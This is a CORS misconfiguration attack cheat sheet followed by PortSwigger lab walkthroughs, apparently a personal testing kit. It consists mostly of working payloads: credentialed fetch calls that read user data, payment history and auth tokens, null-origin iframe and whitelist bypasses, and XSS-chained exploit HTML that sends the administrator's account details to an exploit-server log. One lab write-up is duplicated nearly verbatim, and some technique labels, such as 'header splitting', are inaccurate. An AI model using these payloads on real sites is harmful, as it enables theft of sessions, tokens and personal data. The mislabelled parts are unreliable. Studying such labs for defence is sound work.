 ✅ **CORS (Cross-Origin Resource Sharing) Misconfiguration – Complete Test Case (with Bypass Cases)**

---

# **1. List of Vulnerabilities (CORS Attack Surface)**

* **1.1 `Access-Control-Allow-Origin: *` with Sensitive Data**
  Any website can read API responses.

* **1.2 Reflection of Origin Header**
  Server reflects `Origin:` header blindly.

* **1.3 `Access-Control-Allow-Credentials: true` with Wildcard**
  Allows attacker sites to steal authenticated data.

* **1.4 Weak Domain Whitelist**
  `.example.com` allows `attacker-example.com`.

* **1.5 Null Origin Trust**
  Trusting `Origin: null` (sandboxed iframes, file://).

* **1.6 Subdomain Takeover → CORS Abuse**
  Application trusts subdomains that are hijackable.

* **1.7 Misconfigured Allowed Headers**
  Allowing attacker-controlled custom headers.

* **1.8 Misconfigured Allowed Methods**
  Exposing sensitive endpoints to `PUT`, `DELETE`, etc.

* **1.9 Preflight Request Bypass**
  Forcing browser to skip OPTIONS checks.

* **1.10 JSONP + CORS Combination**
  Leaks data even without CORS.

---

# **2. Sample Payloads (Core Attack Payloads)**

(Simple, safe-to-read examples for testing)

### **2.1 Basic Exploit JavaScript (Reads Sensitive Data)**

```js
fetch("https://victim.com/api/user", {
  credentials: "include"
})
.then(r => r.text())
.then(d => console.log(d));
```

### **2.2 Malicious Website HTML PoC**

```html
<script>
fetch("https://victim.com/api/profile", {credentials: "include"})
  .then(resp => resp.text())
  .then(data => alert(data));
</script>
```

### **2.3 Origin Reflection Test**

Send request with:

```
Origin: https://evil.com
```

If response contains:

```
Access-Control-Allow-Origin: https://evil.com
```

→ Vulnerable.

### **2.4 Null-Origin Test**

Send:

```
Origin: null
```

If server allows:

```
Access-Control-Allow-Origin: null
```

→ Vulnerable.

---

# **3. Bypass Payloads (Advanced Techniques)**

### **3.1 Subdomain Bypass**

Server whitelist:

```
Access-Control-Allow-Origin: *.example.com
```

Attacker uses:

```
evil.example.com
```

### **3.2 Wildcard With Credentials**

If server sends:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Browser blocks normally, BUT attackers use **header splitting**:

```
Origin: https://evil.com:443/
```

### **3.3 Case Manipulation**

```
Origin: HTTPS://EVIL.COM
```

Some servers match case-insensitive incorrectly.

### **3.4 Null-Origin Bypass via sandboxed iframe**

```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>
fetch('https://victim.com/api',{credentials:'include'})
.then(r=>r.text()).then(alert);
</script>"></iframe>
```

### **3.5 Broken Regex Whitelist**

Whitelist:

```
/.*example\.com$/
```

Attacker:

```
https://example.com.evil.net
```

### **3.6 JSON Content-Type Bypass**

```js
fetch("https://victim.com/secret", {
  method: "POST",
  headers: {"Content-Type": "text/plain"},
  body: "test"
})
```

### **3.7 Forbidden Header Bypass**

Server incorrectly allows:

```
Access-Control-Allow-Headers: *
```

Attacker sets:

```
X-Api-Key: evil
```

---

# **4. Updated With Realistic Testing Payloads (Advanced Learning)**

### **4.1 Database Exposure (User Data)**

```js
fetch("https://victim.com/api/v1/users/me", {
  credentials: "include"
})
.then(r => r.json())
.then(console.log);
```

### **4.2 Payment Endpoint Access**

```js
fetch("https://victim.com/payment/history", {
  credentials: "include"
}).then(r => r.text()).then(console.log);
```

### **4.3 Token Leaking via CORS**

```js
fetch("https://victim.com/auth/token", {
  credentials: "include"
}).then(r => r.json()).then(alert);
```

### **4.4 Preflight Abuse**

```js
fetch("https://victim.com/internal/admin", {
  method: "PUT",
  headers: {
    "X-Custom": "test"
  },
  credentials: "include"
})
```

### **4.5 Hijacked Subdomain Exploit**

```js
fetch("https://sub.victim.com/admin/logs", {credentials:'include'})
.then(r=>r.text())
.then(console.log);
```

---

# **5. Validation / Test Steps**

**Step 1:** Send request with custom Origin
→ check reflected `Access-Control-Allow-Origin`.

**Step 2:** Test credentialed requests
→ `credentials: include`.

**Step 3:** Test allowed methods and headers
→ `PUT`, `DELETE`, `X-Custom-Header`.

**Step 4:** Try null-origin
→ `Origin: null`.

**Step 5:** Try subdomain and bypass patterns
→ wildcard, regex, IPv6, encoded origins.

---

# **6. Expected Results / Impact**

* Theft of **user data**, **tokens**, **sessions**.
* Access to internal admin APIs.
* Full account takeover through authenticated CORS misuse.
* Payment history leakage.
* Internal network exposure via SSRF-like effects.

---

# CORS vulnerability with basic origin reflection

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

---------------------------------------------

References: 
- https://portswigger.net/web-security/cors
- https://www.freecodecamp.org/news/exploiting-cors-guide-to-pentesting/

---------------------------------------------

Generated link: https://0a0800cc04a1819b81eb34770017009e.web-security-academy.net/

We have the endpoint "/accountDetails":



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/1.png)


Original code:

```
<html>
  <body>
    <script>

    #Initialize the XMLHttpRequest object, and the application URL vairable 
        var req = new XMLHttpRequest();
        var url = ("APPLICATION URL");

    #MLHttpRequest object loads, exectutes reqListener() function
      req.onload = retrieveKeys;

    #Make GET request to the application accounDetails location
        req.open('GET', url + "/accountDetails",true);
    
    #Allow passing credentials with the requests
    req.withCredentials = true;

    #Send the request 
        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```

Updated code:


```
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("https://0a0800cc04a1819b81eb34770017009e.web-security-academy.net");
      req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
    
    req.withCredentials = true;

        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/2.png)

Decode:



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/3.png)

# CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

---------------------------------------------

References: 

- https://portswigger.net/web-security/cors



![img](images/CORS%20vulnerability%20with%20trusted%20null%20origin/1.png)

---------------------------------------------

We have user's information in /accountDetails:



![img](images/CORS%20vulnerability%20with%20trusted%20null%20origin/2.png)



We will send the payload:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a9e008604151c3181d9023f008a00cf.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a8d00d304c31c4a8174019d019500e6.exploit-server.net//log?key='+this.responseText;
};
</script>"></iframe>
```

We get a request from the administrator user:



![img](images/CORS%20vulnerability%20with%20trusted%20null%20origin/3.png)


# CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Hint: If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.

---------------------------------------------

Reference: https://portswigger.net/web-security/cors





![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/1.png)
![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/2.png)

---------------------------------------------

Generated link: https://0a0900840416f0db818ac0da00ca0002.web-security-academy.net/


We find the endpoint /accountDetails:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/3.png)

There is a button to check the stock which opens a popup with the value:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/4.png)

We find a XSS here:

```
GET /?productId=<script>alert(1)</script>&storeId=1 HTTP/1.1
```





![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/5.png)
![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/6.png)

The url is the following one, a subdomain (stock) which uses HTTP:

```
http://stock.0a0900840416f0db818ac0da00ca0002.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
```

CORS code from previous lab:

```
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("URL");
        req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
        req.withCredentials = true;
        req.send(null);
        function retrieveKeys() {
            location='/log?key='+this.responseText;
        };
  </script>
  <body>
</html>
```

In one-line:

```
<script>var req = new XMLHttpRequest();var url = ("https://0a1e008d0469f84380c3c126007600c7.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url + "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='+this.responseText;};</script>
```

Added to the XSS exploit:

``` 
http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = ("https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url + "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='+this.responseText;};</script>&storeId=1
```

The “+” sign is deleted:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/7.png)

We will change “+” with "%2B

``` 
http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = ("https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url %2B "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};</script>&storeId=1
```

Now we get the request in the logs:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/8.png)

Now we will add it to a payload like this so it opens when the message is received:

```
<body onload="window.open('URL')">
```

There are problems with nested quotes and double quotes so I will create a parameter “payload” with the CORS payload and send it to the victim:

```
<html>
<script>
var payload = "var req = new XMLHttpRequest();var url = (\"https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net\");req.onload = retrieveKeys;req.open('GET', url %2B \"/accountDetails\",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};" ;
</script>

<body onload="window.open('http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>'+payload+'</script>&storeId=1')">
</html>
```

We get the information from administrator:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/9.png)

And decode the API key:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/10.png)


# 10 - CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Hint: If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.

---------------------------------------------

Reference: https://portswigger.net/web-security/cors





![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/1.png)
![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/2.png)

---------------------------------------------

Generated link: https://0a0900840416f0db818ac0da00ca0002.web-security-academy.net/


We find the endpoint /accountDetails:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/3.png)

There is a button to check the stock which opens a popup with the value:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/4.png)

We find a XSS here:

```
GET /?productId=<script>alert(1)</script>&storeId=1 HTTP/1.1
```





![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/5.png)
![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/6.png)

The url is the following one, a subdomain (stock) which uses HTTP:

```
http://stock.0a0900840416f0db818ac0da00ca0002.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
```

CORS code from previous lab:

```
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("URL");
        req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
        req.withCredentials = true;
        req.send(null);
        function retrieveKeys() {
            location='/log?key='+this.responseText;
        };
  </script>
  <body>
</html>
```

In one-line:

```
<script>var req = new XMLHttpRequest();var url = ("https://0a1e008d0469f84380c3c126007600c7.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url + "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='+this.responseText;};</script>
```

Added to the XSS exploit:

``` 
http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = ("https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url + "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='+this.responseText;};</script>&storeId=1
```

The “+” sign is deleted:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/7.png)

We will change “+” with "%2B

``` 
http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = ("https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url %2B "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};</script>&storeId=1
```

Now we get the request in the logs:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/8.png)

Now we will add it to a payload like this so it opens when the message is received:

```
<body onload="window.open('URL')">
```

There are problems with nested quotes and double quotes so I will create a parameter “payload” with the CORS payload and send it to the victim:

```
<html>
<script>
var payload = "var req = new XMLHttpRequest();var url = (\"https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net\");req.onload = retrieveKeys;req.open('GET', url %2B \"/accountDetails\",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};" ;
</script>

<body onload="window.open('http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>'+payload+'</script>&storeId=1')">
</html>
```

We get the information from administrator:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/9.png)

And decode the API key:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/10.png)
